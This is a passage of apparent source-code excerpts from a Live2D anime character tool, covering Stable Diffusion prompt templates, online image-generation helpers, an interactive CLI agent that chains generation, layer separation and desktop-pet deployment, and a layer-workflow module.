1girl, solo, {pose}, {hairstyle}, {hair_color}, {eye_color}, {clothing}, {accessory}, {expression},
(beautiful detailed face:1.3), (beautiful detailed eyes:1.3), (detailed skin texture:1.1), (soft lighting:1.2),
(pastel colors:1.2), (soft color palette:1.2), (dreamy atmosphere:1.1), (ethereal:1.1),
(frills:1.1), (lace:1.1), (ribbons:1.1), (bows:1.1), (jewelry:1.1), (elegant outfit:1.2),
(perfect anatomy:1.2), (correct proportions:1.2), (delicate hands:1.2),
(white background:1.2), (simple background:1.2), (clean background:1.2),
(sharp focus:1.2), (vibrant colors:1.1), (clear lineart:1.3), (smooth shading:1.1),
(extremely detailed:1.2), (intricate details:1.2), (professional illustration:1.2),
(art by Artgerm:1.1), (art by WLOP:1.1), (art by Rossdraws:1.1),
(soft volumetric lighting:1.2), (rim lighting:1.1), (bloom:1.1)"""

# Live2D 专用提示词模板
LIVE2D_PROMPT_TEMPLATE = """(masterpiece:1.4), (best quality:1.3), (ultra detailed:1.2), (highres:1.2),
(anime style:1.3), (illustration:1.2), 1girl, solo, (full body:1.2), (standing:1.1), (looking at viewer:1.2),
{hairstyle}, {hair_color}, {eye_color}, {clothing}, {accessory}, {expression},
(beautiful detailed face:1.3), (beautiful detailed eyes:1.3), (detailed skin texture:1.1), (soft lighting:1.2),
(perfect for Live2D rigging:1.2), (clean lineart:1.3), (clear edges:1.3), (sharp outlines:1.3),
(flat colors:1.2), (minimal shading:1.2), (cel shading:1.2), (distinct color separation:1.2),
(anime coloring:1.2), (sharp lines:1.3), (clean outlines:1.3), (minimal gradients:1.2),
(simple background:1.2), (white background:1.2), (isolated character:1.2),
(clear silhouette:1.2), (symmetrical eyes:1.2), (simple hair strands:1.1),
(visible neck and shoulders:1.2), (visible arms and hands:1.2), (visible legs and feet:1.2),
(closed mouth:1.1), (neutral expression:1.1), (front view:1.2), (straight-on view:1.2),
(perfect anatomy:1.2), (correct proportions:1.2), (delicate hands:1.2),
(sharp focus:1.2), (vibrant colors:1.1)"""

# 高质量反向提示词
HIGH_QUALITY_NEGATIVE_PROMPT = """(lowres:1.4), (bad anatomy:1.4), (bad hands:1.3), (text:1.3), (error:1.3), (missing fingers:1.3),
(extra digit:1.3), (fewer digits:1.3), (cropped:1.2), (worst quality:1.3), (low quality:1.3),
(normal quality:1.2), (jpeg artifacts:1.2), (signature:1.2), (watermark:1.2), (username:1.2), (blurry:1.3),
(artist name:1.2), (bad proportions:1.3), (extra limbs:1.3), (cloned face:1.2), (disfigured:1.3),
(gross proportions:1.3), (malformed limbs:1.3), (missing arms:1.2), (missing legs:1.2),
(extra arms:1.2), (extra legs:1.2), (fused fingers:1.2), (too many fingers:1.2), (long neck:1.2),
(photorealistic:1.2), (realistic:1.2), (3d:1.2), (western:1.2), (sketch:1.1), (rough:1.1), (draft:1.1),
(complex background:1.2), (messy hair:1.2), (messy clothes:1.2),
(depth of field:1.1), (blurry background:1.2), (multiple girls:1.3), (multiple people:1.3)"""

# Live2D 反向提示词（更严格）
LIVE2D_NEGATIVE_PROMPT = """(lowres:1.4), (bad anatomy:1.4), (bad hands:1.3), (text:1.3), (error:1.3), (missing fingers:1.3),
(extra digit:1.3), (fewer digits:1.3), (cropped:1.2), (worst quality:1.3), (low quality:1.3),
(normal quality:1.2), (jpeg artifacts:1.2), (signature:1.2), (watermark:1.2), (username:1.2), (blurry:1.3),
(artist name:1.2), (bad proportions:1.3), (extra limbs:1.3), (cloned face:1.2), (disfigured:1.3),
(gross proportions:1.3), (malformed limbs:1.3), (missing arms:1.2), (missing legs:1.2),
(extra arms:1.2), (extra legs:1.2), (fused fingers:1.2), (too many fingers:1.2), (long neck:1.2),
(photorealistic:1.2), (realistic:1.2), (3d:1.2), (western:1.2), (sketch:1.1), (rough:1.1), (draft:1.1),
(complex background:1.2), (messy hair:1.2), (messy clothes:1.2),
(profile view:1.2), (side view:1.2), (back view:1.2), (turned away:1.2),
(open mouth:1.2), (talking:1.2), (shouting:1.2), (laughing:1.2), (crying:1.2),
(dynamic pose:1.2), (action pose:1.2), (jumping:1.2), (running:1.2), (sitting:1.2), (lying down:1.2),
(partial body:1.2), (cropped:1.2), (off-screen:1.2), (out of frame:1.2),
(gradient shading:1.2), (soft shading:1.2), (painterly:1.2), (watercolor:1.2),
(noise:1.2), (grainy:1.2), (pixelated:1.2), (compression artifacts:1.2)"""


def _get_project_root() -> Path:
    """返回项目根目录。

    当通过根目录包装器运行时，LIVE2D_PROJECT_ROOT 指向仓库根目录，
    输出文件会保存在根目录的 output/ 中；直接在 skill 目录运行时，
    回退到脚本所在目录。
    """
    return Path(os.environ.get("LIVE2D_PROJECT_ROOT", Path(__file__).parent))


def generate_random_features():
    """生成随机特征组合，避免撞衫"""
    features = {
        'hairstyle': random.choice(FEATURES['hairstyle']),
        'hair_color': random.choice(FEATURES['hair_color']),
        'eye_color': random.choice(FEATURES['eye_color']),
        'clothing': random.choice(FEATURES['clothing']),
        'accessory': random.choice(FEATURES['accessories']),
        'expression': random.choice(FEATURES['expression']),
        'pose': random.choice(FEATURES['pose']),
    }
    return features


def build_prompt(custom_prompt="", live2d_optimized=True, high_quality=True, use_structured=True):
    """构建优化的多样化提示词 v6.0 - 支持结构化解析

    Returns:
        如果解析成功或随机生成成功，返回 (prompt, features) 元组
        如果出错，返回 (prompt, {}) 或 ("", {})
    """

    # v6.0: 优先使用结构化解析
    if use_structured and custom_prompt:
        try:
            from local_image_generator import PromptEngineer
            character = PromptEngineer.parse_character_from_text(custom_prompt)

            # 如果解析到了特征，使用结构化构建
            if any([character.get("hair_color"), character.get("features"),
                    character.get("clothing")]):
                print(f"🧠 结构化解析角色: {custom_prompt}")
                print(f"   发色: {character.get('hair_color', '默认')}")
                print(f"   发型: {character.get('hair_style', '默认')}")
                print(f"   眼睛: {character.get('eye_color', '默认')}")
                print(f"   特征: {', '.join(character.get('features', [])) or '无'}")
                print(f"   表情: {character.get('expression', '默认')}")
                print(f"   服装: {character.get('clothing', '默认')}")

                prompt, _ = PromptEngineer.build_prompt_from_character(
                    character, style="anime", live2d_mode=live2d_optimized
                )

                # 构建特征字典用于返回
                features = {
                    'hairstyle': character.get('hair_style', 'long hair'),
                    'hair_color': character.get('hair_color', 'pink') + ' hair',
                    'eye_color': character.get('eye_color', 'blue') + ' eyes',
                    'clothing': character.get('clothing', 'school uniform'),
                    'accessory': 'hair ribbon',
                    'expression': character.get('expression', 'smile'),
                    'pose': 'standing',
                }
                return prompt, features
        except Exception as e:
            print(f"⚠️ 结构化解析失败，回退到随机生成: {e}")

    # 传统随机特征生成
    features = generate_random_features()

    if live2d_optimized:
        hairstyle = random.choice(LIVE2D_HAIRSTYLES)
        prompt = LIVE2D_PROMPT_TEMPLATE.format(
            hairstyle=hairstyle,
            hair_color=features['hair_color'],
            eye_color=features['eye_color'],
            clothing=features['clothing'],
            accessory=features['accessory'],
            expression=features['expression']
        )
        prompt = ' '.join(prompt.split())
        return prompt, features
    elif high_quality:
        prompt = PROFESSIONAL_PROMPT_TEMPLATE.format(
            pose=features['pose'],
            hairstyle=features['hairstyle'],
            hair_color=features['hair_color'],
            eye_color=features['eye_color'],
            clothing=features['clothing'],
            accessory=features['accessory'],
            expression=features['expression']
        )
        if custom_prompt:
            prompt = custom_prompt + ", " + prompt
        prompt = ' '.join(prompt.split())
        return prompt, features
    else:
        prompt_parts = []
        if custom_prompt:
            prompt_parts.append(custom_prompt)
        prompt_parts.append("1girl, solo, portrait")
        prompt_parts.append(features['hairstyle'])
        prompt_parts.append(features['hair_color'])
        prompt_parts.append(features['eye_color'])
        prompt_parts.append(features['clothing'])
        prompt_parts.append(features['accessory'])
        prompt_parts.append(features['expression'])
        prompt_parts.append(features['pose'])
        return " ".join(prompt_parts), features


def get_latest_image(output_dir):
    """获取最新图片"""
    png_files = sorted(output_dir.glob("*.png"), key=lambda p: p.stat().st_mtime, reverse=True)
    return str(png_files[0]) if png_files else None


def generate_image_pollinations(prompt, output_dir, width=512, height=768, seed=None):
    """
    使用 Pollinations.ai 免费在线生成图片
    无需任何依赖，开箱即用
    """
    import urllib.request
    import urllib.parse

    print(f"\n🌐 使用 Pollinations.ai 免费生成...")
    print(f"📝 提示词: {prompt[:100]}...")

    if seed is None:
        seed = random.randint(0, 999999999)

    # 构建 Pollinations.ai URL
    encoded_prompt = urllib.parse.quote(prompt)
    url = f"https://image.pollinations.ai/prompt/{encoded_prompt}?width={width}&height={height}&seed={seed}&nologo=true"

    try:
        output_path = os.path.join(output_dir, f"pollinations_{seed}.png")
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0'
            }
        )

        print(f"⬇️  正在下载...")
        with urllib.request.urlopen(req, timeout=120) as response:
            with open(output_path, 'wb') as f:
                f.write(response.read())

        if os.path.exists(output_path) and os.path.getsize(output_path) > 1000:
            print(f"✅ 成功！使用 Pollinations.ai 免费生成")
            print(f"📁 保存至: {output_path}")
            return output_path, seed
        else:
            print("❌ 下载的文件无效")
            return None, seed

    except Exception as e:
        print(f"❌ Pollinations.ai 生成失败: {e}")
        return None, seed


def generate_image_huggingface(prompt, output_dir, width=512, height=768, seed=None):
    """
    使用 Hugging Face Inference API 免费生成图片
    无需 API Key，使用公开模型
    """
    import urllib.request
    import urllib.parse
    import json

    print(f"\n🌐 使用 Hugging Face 免费生成...")
    print(f"📝 提示词: {prompt[:100]}...")

    if seed is None:
        seed = random.randint(0, 999999999)

    # 使用 Stable Diffusion 公开 API
    api_url = "https://api-inference.huggingface.co/models/stabilityai/stable-diffusion-2-1"
    payload = json.dumps({"inputs": prompt, "parameters": {"seed": seed}}).encode('utf-8')

    try:
        output_path = os.path.join(output_dir, f"huggingface_{seed}.png")
        req = urllib.request.Request(
            api_url,
            data=payload,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
        )

        print(f"⬇️  正在请求 Hugging Face API...")
        with urllib.request.urlopen(req, timeout=180) as response:
            with open(output_path, 'wb') as f:
                f.write(response.read())

        if os.path.exists(output_path) and os.path.getsize(output_path) > 1000:
            print(f"✅ 成功！使用 Hugging Face 免费生成")
            print(f"📁 保存至: {output_path}")
            return output_path, seed
        else:
            print("❌ 下载的文件无效")
            return None, seed

    except Exception as e:
        print(f"❌ Hugging Face 生成失败: {e}")
        return None, seed


def generate_image_deepai(prompt, output_dir, width=512, height=768, seed=None):
    """
    使用 DeepAI 免费生成图片
    无需 API Key
    """

...（省略后续 810 行，原文件共 1160 行）...

```

## 交互式 Agent（节选）
**文件**：`.trae/skills/live2d-master-agent/live2d_agent.py`
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Live2D Master Agent - Interactive CLI Entry Point
Just run this script and the Agent will guide you through all operations

Usage:
    python live2d_agent.py

Supports natural language conversation, e.g.:
    - "I want a cat girl"
    - "Generate a mecha character"
    - "Deploy desktop pet"
    - "Use my image"

Note: Agent interface is in English for terminal compatibility.
You can describe characters in any language (English recommended for terminals).
"""

import sys
import os
import argparse
from pathlib import Path


def _get_project_root() -> Path:
    """返回项目根目录。

    根目录包装器设置 LIVE2D_PROJECT_ROOT；直接运行 skill 时回退到脚本目录。
    """
    return Path(os.environ.get("LIVE2D_PROJECT_ROOT", Path(__file__).parent))


# 确保可以导入同级模块
sys.path.insert(0, str(Path(__file__).parent))


def print_banner():
    """打印欢迎界面"""
    print(r"""
============================================================

     Live2D Master Agent v7.2
     Your Live2D Assistant - Tell me what you want

============================================================
""")


def print_menu():
    """打印主菜单（英文，兼容终端）"""
    print("""
[1] Generate Character  - Generate a character from description
[2] Layer Separation    - Split image into Live2D layers
[3] Desktop Pet         - Deploy as animated desktop pet
[4] Full Workflow       - Generate + Layer + Pet in one go
[5] Settings            - API keys, output directory
[6] Help                - Usage guide
[0] Exit                - Quit

Tip: You can also type English commands directly:
     "generate a cat girl" / "layer my image" / "deploy pet"
""")


def get_input(prompt: str = "\nEnter your choice (0-6 or command): ") -> str:
    """Get user input"""
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print("\n👋 Goodbye!")
        sys.exit(0)


def detect_intent(user_input: str) -> str:
    """
    Detect user intent
    Returns: 'generate', 'layer', 'pet', 'workflow', 'settings', 'help', 'exit'
    Supports both English and Chinese keywords for terminal compatibility
    """
    user_input_lower = user_input.lower().strip()

    # Exit
    if user_input in ['0', 'exit', 'quit', 'q', 'bye', 'goodbye', '退出', '再见']:
        return 'exit'

    # Generate character
    if any(kw in user_input_lower for kw in [
        'generate', 'create', 'make', 'draw', 'gen', 'g ', '生成', '创建', '做', '画', '生成角色', '1'
    ]):
        return 'generate'

    # Layer separation
    if any(kw in user_input_lower for kw in [
        'layer', 'separate', 'split', 'layers', '分层', '分割', '拆分', '图层', '2'
    ]):
        return 'layer'

    # Desktop pet
    if any(kw in user_input_lower for kw in [
        'pet', 'desktop', 'deploy', '桌宠', '宠物', '桌面', '部署', '3'
    ]):
        return 'pet'

    # Full workflow
    if any(kw in user_input_lower for kw in [
        'workflow', 'full', 'all', 'complete', '一键', '完整', '全部', '4'
    ]):
        return 'workflow'

    # Settings
    if any(kw in user_input_lower for kw in [
        'settings', 'config', 'setup', 'key', 'api', '设置', '配置', '密钥', '5'
    ]):
        return 'settings'

    # Help
    if any(kw in user_input_lower for kw in [
        'help', 'h', 'how', 'usage', 'guide', '帮助', '说明', '怎么用', '6'
    ]):
        return 'help'

    # Default: if contains character description keywords, treat as generate
    character_keywords = [
        'anime', 'girl', 'boy', 'character', 'cat', 'maid', 'witch', 'knight',
        '少女', '少年', '女孩', '男孩', '角色', '人物', '猫娘', '女仆', '巫女'
    ]
    if any(kw in user_input_lower for kw in character_keywords):
        return 'generate'

    return 'unknown'


def handle_generate():
    """Handle character generation request"""
    print("\n🎨 Character Generation")
    print("-" * 50)

    description = get_input("Describe your character (e.g., silver hair witch, purple eyes, kimono): ")
    if not description:
        print("❌ Description cannot be empty")
        return

    print(f"\n🎯 Generating character: {description}")
    print("⏳ This may take a while...\n")

    # Call master_tool.py
    import subprocess
    result = subprocess.run(
        [sys.executable, 'master_tool.py', description],
        capture_output=False,
        text=True
    )

    if result.returncode == 0:
        print("\n✅ Character generated successfully!")

        # Ask if continue to layer separation
        continue_layer = get_input("\nLayer separation now? [y/n]: ").lower()
        if continue_layer in ['y', 'yes']:
            handle_layer_from_output()
    else:
        print("\n❌ Generation failed. Check network or install local model")


def handle_layer_from_output():
    """Find latest image in output dir and layer it"""
    output_dir = _get_project_root() / 'output'
    if not output_dir.exists():
        print("❌ Output directory not found")
        return

    # Find latest character image
    images = list(output_dir.glob('*.png')) + list(output_dir.glob('*.jpg'))
    if not images:
        print("❌ No generated images found")
        return

    latest_image = max(images, key=lambda p: p.stat().st_mtime)
    print(f"\n📐 Layering latest image: {latest_image.name}")

    handle_layer_image(str(latest_image))


def handle_layer_image(image_path: str = None):
    """Handle image layer separation"""
    if not image_path:
        image_path = get_input("Enter image path: ").strip().strip('"')

    if not os.path.exists(image_path):
        print(f"❌ File not found: {image_path}")
        return

    print(f"\n📐 Layering: {image_path}")
    print("⏳ Processing...\n")

    import subprocess
    project_root = _get_project_root()
    workflow_output = project_root / 'output' / 'workflow'
    result = subprocess.run(
        [sys.executable, 'live2d_workflow.py', '--input', image_path, '--output', str(workflow_output)],
        capture_output=False,
        text=True
    )

    if result.returncode == 0:
        print("\n✅ Layer separation complete!")

        # Ask if deploy desktop pet
        continue_pet = get_input("\nDeploy desktop pet now? [y/n]: ").lower()
        if continue_pet in ['y', 'yes']:
            handle_pet_from_layer()
    else:
        print("\n❌ Layer separation failed")


def handle_pet_from_layer():
    """Deploy desktop pet from latest layer output"""
    # Find latest layer directory
    output_dir = _get_project_root() / 'output'
    layer_dirs = list(output_dir.glob('workflow/layers_*'))

    if not layer_dirs:
        print("❌ No layer results found")
        return

    latest_layer = max(layer_dirs, key=lambda p: p.stat().st_mtime)

    pet_name = get_input("Name your pet (default: MyPet): ").strip()
    if not pet_name:
        pet_name = "MyPet"

    print(f"\n🐱 Deploying pet: {pet_name}")
    print("⏳ Generating animation frames...\n")

    import subprocess
    project_root = _get_project_root()
    pet_output = project_root / 'output' / f'pet_{pet_name}'
    result = subprocess.run(
        [sys.executable, 'live2d_desktop_pet.py', '--layers-dir', str(latest_layer), '--output', str(pet_output)],
        capture_output=False,
        text=True
    )

    if result.returncode == 0:
        print(f"\n✅ Pet '{pet_name}' deployed!")
        print(f"📁 Location: {pet_output}/")
        print(f"🚀 Run: python {pet_output}/run_pet.py")
    else:
        print("\n❌ Pet deployment failed")


def handle_workflow():
    """Handle full workflow"""
    print("\n🚀 Full Workflow (Describe → Generate → Layer → Pet)")
    print("-" * 50)

    description = get_input("Describe your character: ")
    if not description:
        print("❌ Description cannot be empty")
        return

    pet_name = get_input("Name your pet (default: MyPet): ").strip()
    if not pet_name:
        pet_name = "MyPet"

    print(f"\n🚀 Starting full workflow...")
    print(f"📝 Character: {description}")
    print(f"🐱 Pet name: {pet_name}")
    print("\n⏳ Step 1/4: Generating character...")

    import subprocess

    # Step 1: Generate
    result = subprocess.run(
        [sys.executable, 'master_tool.py', description],
        capture_output=False,
        text=True
    )

    if result.returncode != 0:
        print("\n❌ Character generation failed")
        return

    # Find latest generated image
    output_dir = _get_project_root() / 'output'
    images = list(output_dir.glob('*.png')) + list(output_dir.glob('*.jpg'))
    if not images:
        print("❌ No generated images found")
        return
    latest_image = max(images, key=lambda p: p.stat().st_mtime)

    print("\n⏳ Step 2/4: Image optimization...")
    print("⏳ Step 3/4: Smart layering...")

    # Step 2-3: Layer
    workflow_output = output_dir / 'workflow'
    result = subprocess.run(
        [sys.executable, 'live2d_workflow.py', '--input', str(latest_image), '--output', str(workflow_output)],
        capture_output=False,

...（省略后续 199 行，原文件共 499 行）...

```

## 端到端工作流（节选）
**文件**：`.trae/skills/live2d-master-agent/live2d_workflow.py`
```
#!/usr/bin/env python3
"""
Live2D Master Workflow - 端到端完整工作流 v2.1
基于多维度信息整合优化：
- Live2D官方文档 (docs.live2d.com)
- B站社区实践 (bilibili.com)
- GitHub开源项目

工作流：
┌─────────────────┐
│ 1. 智能生成     │ → AI生成+官方标准提示词
└────────┬────────┘
         │
┌────────▼────────┐
│ 2. 质量评估     │ → 官方标准检查(加权评分)
└────────┬────────┘
         │
┌────────▼────────┐
│ 3. 图像优化     │ → 背景去除/边缘增强/尺寸调整
└────────┬────────┘
         │
┌────────▼────────┐
│ 4. 智能分层     │ → K-means/官方部件命名(49层)
└────────┬────────┘
         │
┌────────▼────────┐
│ 5. PSD生成      │ → 官方兼容格式+完整指南
└─────────────────┘
"""

import os
import sys
import time
import argparse
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    from PIL import Image, ImageEnhance, ImageFilter
    import numpy as np
except ImportError as e:
    print(f"[ERROR] Missing required dependency: {e}")
    print("Please install core dependencies: python -m pip install Pillow numpy")
    sys.exit(1)


def _get_project_root() -> Path:
    """返回项目根目录。

    根目录包装器会设置 LIVE2D_PROJECT_ROOT；在 skill 目录直接运行时回退到
    脚本所在目录，保证两种使用方式都能正确找到输出路径。
    """
    return Path(os.environ.get("LIVE2D_PROJECT_ROOT", Path(__file__).parent))


class Live2DWorkflow:
    """Live2D完整工作流管理器 v2.1
    基于多维度信息整合优化：
    - Live2D官方文档 (docs.live2d.com)
    - B站社区实践 (bilibili.com)
    - GitHub开源项目
    """

    # ====== Live2D官方PSD标准 ======
    PSD_STANDARD = {
        "format": "PSD",
        "color_mode": "RGB",
        "color_channel": "8bit/channel",
        "color_profile": "sRGB",
        "head_min_size": 1000,      # 头部最小1000px
        "height_min": 3000,          # 整体最小高度
        "height_max": 8000,          # 最大高度
        "dpi": 300,                  # 分辨率
        "art_mesh_margin": 1,        # 默认1px边距
    }

    # ====== Live2D官方标准图层顺序（从后往前，52层） ======
    LIVE2D_LAYER_ORDER = [
        # 背景层
        "背景",
        # 后层头发
        "头发_后",
        "头发_阴影_后",
        # 身体后层
        "脖子",
        "胸腔",
        "腰臀",
        # 腿部
        "左腿_大腿",
        "左腿_小腿",
        "左脚",
        "右腿_大腿",
        "右腿_小腿",
        "右脚",
        # 手臂后层
        "左臂_上臂",
        "左臂_下臂",
        "左手",
        "右臂_上臂",
        "右臂_下臂",
        "右手",
        # 服装
        "衣服_内衣",
        "衣服_外衣",
        "饰品",
        # 面部基础
        "脸_基础",
        "脸_腮红",
        # 耳朵
        "耳朵_左",
        "耳朵_右",
        # 鼻子
        "鼻子",
        # 嘴巴（从里到外）
        "嘴巴_口腔",
        "嘴巴_舌头",
        "嘴巴_牙齿",
        "嘴巴_下嘴唇",
        "嘴巴_上嘴唇",
        # 眼睛（从里到外）
        "左眼_眼白",
        "左眼_眼珠",
        "左眼_瞳孔",
        "左眼_高光",
        "右眼_眼白",
        "右眼_眼珠",
        "右眼_瞳孔",
        "右眼_高光",
        # 睫毛
        "左眼_下睫毛",
        "右眼_下睫毛",
        "左眼_上睫毛",
        "右眼_上睫毛",
        # 眉毛
        "眉毛_左",
        "眉毛_右",
        # 前层头发
        "头发_侧发_左",
        "头发_侧发_右",
        "头发_刘海",
        "头发_呆毛",
        "头发_高光",
        # 阴影层（正片叠底）
        "阴影_头到身体",
        "阴影_衣服",
    ]

    # ====== 部件颜色映射（扩展自B站标准） ======
    PART_COLOR_RANGES = {
        "头发_后": [
            (0, 0, 0), (20, 20, 20), (50, 50, 50),
            (100, 50, 30), (60, 40, 20),
        ],
        "头发_刘海": [
            (0, 0, 0), (30, 30, 30), (80, 60, 40),
        ],
        "头发_侧发": [
            (20, 20, 20), (40, 40, 40), (70, 50, 30),
        ],
        "头发_高光": [
            (255, 255, 255), (200, 200, 200), (255, 250, 200),
        ],
        "脸_基础": [
            (255, 220, 200), (255, 200, 180),
            (230, 180, 160), (200, 160, 140),
        ],
        "脸_腮红": [
            (255, 180, 180), (255, 160, 160), (255, 200, 200),
        ],
        "眉毛_左": [
            (80, 60, 40), (60, 40, 20), (100, 80, 60),
        ],
        "眉毛_右": [
            (80, 60, 40), (60, 40, 20), (100, 80, 60),
        ],
        "左眼_眼白": [
            (255, 255, 255), (240, 240, 240),
        ],
        "右眼_眼白": [
            (255, 255, 255), (240, 240, 240),
        ],
        "左眼_眼珠": [
            (100, 150, 200), (200, 150, 100),
            (150, 100, 200), (100, 200, 150),
        ],
        "右眼_眼珠": [
            (100, 150, 200), (200, 150, 100),
            (150, 100, 200), (100, 200, 150),
        ],
        "左眼_瞳孔": [
            (0, 0, 0), (20, 20, 20), (50, 50, 50),
        ],
        "右眼_瞳孔": [
            (0, 0, 0), (20, 20, 20), (50, 50, 50),
        ],
        "左眼_高光": [
            (255, 255, 255), (255, 255, 200),
        ],
        "右眼_高光": [
            (255, 255, 255), (255, 255, 200),
        ],
        "鼻子": [
            (255, 200, 180), (240, 180, 160),
        ],
        "嘴巴_上嘴唇": [
            (255, 150, 150), (255, 120, 120), (200, 100, 100),
        ],
        "嘴巴_下嘴唇": [
            (255, 160, 160), (255, 140, 140), (220, 120, 120),
        ],
        "嘴巴_口腔": [
            (150, 50, 50), (180, 80, 80), (120, 40, 40),
        ],
        "耳朵_左": [
            (255, 220, 200), (255, 200, 180), (230, 180, 160),
        ],
        "耳朵_右": [
            (255, 220, 200), (255, 200, 180), (230, 180, 160),
        ],
        "脖子": [
            (255, 220, 200), (255, 200, 180), (230, 180, 160),
        ],
        "胸腔": [
            (255, 220, 200), (255, 200, 180), (230, 180, 160),
        ],
        "衣服_外衣": [
            (200, 100, 100), (100, 200, 100),
            (100, 100, 200), (200, 200, 100),
            (150, 150, 150), (80, 80, 80),
        ],
        "衣服_内衣": [
            (255, 255, 255), (240, 240, 240),
            (200, 200, 200), (180, 180, 180),
        ],
        "饰品": [
            (255, 215, 0), (255, 255, 0),    # 金色
            (192, 192, 192), (255, 255, 255), # 银色
            (255, 100, 100), (100, 255, 100), # 彩色
        ],
        "阴影_头到身体": [
            (100, 100, 100), (80, 80, 80), (120, 120, 120),
        ],
        "阴影_衣服": [
            (100, 100, 100), (80, 80, 80), (120, 120, 120),
        ],
        "背景": [
            (240, 240, 250), (255, 255, 255),
            (200, 200, 210), (220, 220, 230),
        ],
    }

    # ====== B站/官方质量评估标准 ======
    QUALITY_CHECKS = {
        "canvas_size": {"weight": 0.30, "min": 3000, "max": 8000},
        "edge_clarity": {"weight": 0.30, "threshold": 30},
        "color_count": {"weight": 0.20, "optimal": 1000},
        "format": {"weight": 0.20, "mode": "RGB"},
    }

    def __init__(self, output_dir: str = "./output",
                 provider: str = "auto", k_clusters: int = 12):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.provider = provider
        self.k_clusters = k_clusters
        self.layers: List[Dict] = []

    def run_full_workflow(self, prompt: str,
                          input_image: Optional[str] = None,
                          deploy_desktop: bool = False) -> Optional[str]:
        """运行完整工作流
        返回最终PSD文件路径
        
        Args:
            prompt: 角色描述提示词
            input_image: 现有图片路径（可选）
            deploy_desktop: 是否部署为桌面桌宠
        """
        print("=" * 80)
        print("🎬 Live2D Master Workflow v2.1 - 完整工作流")
        print("=" * 80)

        # 步骤1：生成/获取图片
        print("\n" + "=" * 80)
        print("📷 步骤 1/5: 获取角色图片")
        print("=" * 80)

        if input_image:
            image_path = input_image
            print(f"📁 使用现有图片: {image_path}")
        else:
            image_path = self._generate_character(prompt)
            if not image_path:
                print("❌ 图片生成失败")
                return None

        # 步骤2：质量评估
        print("\n" + "=" * 80)
        print("📊 步骤 2/5: Live2D适配度评估")
        print("=" * 80)

...（省略后续 692 行，原文件共 992 行）...

```

## 本地图像生成器（节选）
**文件**：`.trae/skills/live2d-master-agent/local_image_generator.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent - 图像生成器 v6.0
支持本地 Stable Diffusion + 商汤SenseNova云端 + 多种免费服务

核心升级：
- 🎯 商业级 AI 质量（匹配 DALL-E 3 / Seedream）
- ☁️ 商汤SenseNova云端生成（OpenAI兼容）
- 🦴 Live2D分层专用模式（全身照+部件分离+遮挡补全）
- 🔧 一键生成→自动分层
- 🔄 多阶段生成管道（草稿→精修→超分）
- 🤖 智能质量评估 + 自动重试（7维度Live2D适配度）
- 🎨 参考图风格自动分析
- 📊 批量生成选最优
- 🔐 安全审计修复（7项安全问题）

使用方法：
    # 基础生成
    python local_image_generator.py "cute anime girl"
    
    # 商汤SenseNova + Live2D分层专用
    python local_image_generator.py --provider sensenova --live2d-rig "蓝发猫耳少女"
    
    # 一键生成+自动分层
    python local_image_generator.py --provider sensenova --live2d-rig --auto-layer "蓝发猫耳少女"
    
    # 本地SD多阶段生成
    python local_image_generator.py --model "gsdf/Counterfeit-V3.0" --quality ultra --batch 5 "beautiful character"
    
    # 参考图风格迁移
    python local_image_generator.py --reference ref.png --style-transfer "new character"
"""

import os
import sys
import time
import argparse
import warnings
from pathlib import Path
from typing import Optional, Tuple, Dict, List, Union
import json
import numpy as np

warnings.filterwarnings("ignore", category=FutureWarning)
warnings.filterwarnings("ignore", category=UserWarning)


def _get_project_root() -> Path:
    """返回项目根目录。根目录包装器通过 LIVE2D_PROJECT_ROOT 指定。"""
    return Path(os.environ.get("LIVE2D_PROJECT_ROOT", Path(__file__).parent))


class ModelConfig:
    """模型配置 - 基于搜索研究的最佳模型选择"""

    MODELS = {
        "anything-v3": {
            "id": "Linaqruf/anything-v3.0",
            "desc": "Anything V3 - 通用动漫风格",
            "size": "约 4GB",
            "quality": "standard",
            "best_for": "通用动漫角色",
            "type": "sd15",
        },
        "anything-v5": {
            "id": "stablediffusionapi/anything-v5",
            "desc": "Anything V5 - 高质量动漫",
            "size": "约 4GB",
            "quality": "high",
            "best_for": "精细动漫角色",
            "type": "sd15",
        },
        "counterfeit-v3": {
            "id": "gsdf/Counterfeit-V3.0",
            "desc": "Counterfeit V3 - 细腻画风（推荐）",
            "size": "约 4GB",
            "quality": "ultra",
            "best_for": "高质量插画风格",
            "type": "sd15",
        },
        "meinaMix": {
            "id": "Meina/MeinaMix",
            "desc": "MeinaMix - 萌系风格",
            "size": "约 4GB",
            "quality": "high",
            "best_for": "萌系角色",
            "type": "sd15",
        },
        "pastel-mix": {
            "id": "andite/pastel-mix",
            "desc": "Pastel Mix - 柔和色彩（推荐）",
            "size": "约 4GB",
            "quality": "high",
            "best_for": "柔和梦幻风格",
            "type": "sd15",
        },
        "abyss-orange": {
            "id": "WarriorMama777/OrangeMixs",
            "desc": "AbyssOrangeMix - 丰富色彩",
            "size": "约 4GB",
            "quality": "high",
            "best_for": "色彩丰富的角色",
            "type": "sd15",
        },
        "shiitake-mix": {
            "id": "Vsukiyaki/ShiitakeMix",
            "desc": "Shiitake-Mix - SDXL动漫",
            "size": "约 7GB",
            "quality": "ultra",
            "best_for": "SDXL高质量动漫",
            "type": "sdxl",
        },
        "nova-anime": {
            "id": "NovaAnimeXL",
            "desc": "Nova Anime XL - 2.5D风格",
            "size": "约 7GB",
            "quality": "ultra",
            "best_for": "2.5D动漫风格",
            "type": "sdxl",
        },
    }

    QUALITY_PRESETS = {
        "draft": {
            "steps": 20,
            "guidance_scale": 7.0,
            "desc": "快速草稿",
        },
        "standard": {
            "steps": 30,
            "guidance_scale": 7.5,
            "desc": "标准质量",
        },
        "high": {
            "steps": 40,
            "guidance_scale": 8.0,
            "desc": "高质量",
        },
        "ultra": {
            "steps": 50,
            "guidance_scale": 8.5,
            "desc": "超高质量",
        },
    }


class PromptEngineer:
    """GPT-4 风格提示词工程 - 自动扩展和优化提示词 v6.0"""

    # 艺术家风格库 - 基于参考图风格分析
    ARTISTS = {
        "anime": [
            "art by Artgerm", "art by WLOP", "art by Rossdraws",
